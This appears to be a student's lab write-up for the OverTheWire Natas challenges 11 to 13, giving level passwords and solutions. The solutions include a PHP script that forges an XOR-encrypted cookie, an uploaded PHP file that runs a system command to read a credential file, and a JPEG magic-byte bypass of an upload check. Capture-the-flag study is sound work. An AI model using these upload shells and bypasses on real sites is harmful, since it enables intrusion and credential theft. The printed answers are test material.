# OverTheWire Natas Project Part #1

## Student Information

* Student name: **Benjamin Greenberg**
* NetId: **bgreenb3**


## Project Description

In this project, you will be complete the Natas challenges at <https://overthewire.org/wargames/natas/>. In this part of the lab, you will complete challenges Natas 0â€“Natas 13. For each challenge, you will complete the following worksheet describing:
1. The credentials found in the challenge.
2. How you solved the challenge. Include any JavaScript or other scripts necessary to retrieve the credentials.
3. What sins (as found in the *24 Deadly Sins* book) are evidenced in the challenge.
4. How those sins should be addressed to address your exploit.

In the workshop, the challenges are named based on the username used to login to the shell for that challenge. For example, the challenge labeled "Natas 10" will be logged into with the username natas10, and the solution will be the credentials for the user Natas11.

You can find a basic guide for markdown formatting [here](https://www.markdownguide.org/basic-syntax/). In particular, note the [code section](https://www.markdownguide.org/basic-syntax/#code) which should be used to annotate any code or commands used in your writeup.


## Hints
* Natas 11: `plaintext ^ key` gives the ciphertext. What does `plaintext ^ ciphertext` equal?

### Natas 11

#### Credentials
Password: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3

#### How you passed the challenge
1) I looked at the source code and saw that xor_encrypt was used in the same step regardless if it was for encryption or decryption, so I wrote a dummy xor_encryption with the data for the default cookie as the key to get the key used for encryption
2) I noticed that the result I got wasn't working but it did follow a pattern so I just manually edited the key I got to finish the pattern
3) Then I created input data with ```showpassword: yes``` as the input and the key as what I obtained in the previous step and I got the website to show the password

```xor.php```
```php
<?php
$cookie = "ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=";

function xor_enc($data) {
    // $key = json_encode(array("showpassword"=>"no", "bgcolor"=>"#ffffff"));
    $key = "qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8J";
    $out = '';

    for ($i=0;$i<strlen($data); $i++) {
        $out .= $data[$i] ^ $key[$i % strlen($key)];
    }

    return $out;
}

printf("%s\n", base64_encode(xor_enc(json_encode(array("showpassword"=>"yes", "bgcolor"=>"#ffffff"))));
// printf("%s\n", xor_enc(base64_decode($cookie)));

?>
```

#### What sins are evidenced in this challenge

### Natas 12

#### Credentials
Password: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY

#### How you passed the challenge
1) I looked through the source code and tried uploading a few different files
2) I saw that while the filename is changed, the extension in the hidden filename field is preserved so I changed the extension of the filename to php
3) I uploaded the following script to display the password at the link of the uploaded file

```image.php```
```php
<?php
    system("cat /etc/natas_webpass/natas13");
?>
```

#### What sins are evidenced in this challenge
Sin #4, Sin #12, Sin #16

#### How could those sins be mitigated

### Natas 13

#### Credentials
Password: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

#### How you passed the challenge
1) I followed the same steps as Natas 12, except I prepended the file with four characters
2) Then I opened the file with the hex editor in VSCode and replaced those four characters with the magic number for JPEG files that ```exif_imagetype``` was looking for 

##### Magic Number
````0xFF 0xD8 0xFF 0xE0```

#### What sins are evidenced in this challenge
Sin #4, Sin #12, Sin #16


#### How could those sins be mitigated

Have multiple layers of verification and not just a simple check that only checks the first few bytes
Don't rely on hidden input fields that can be changed
Don't make uploaded files executable
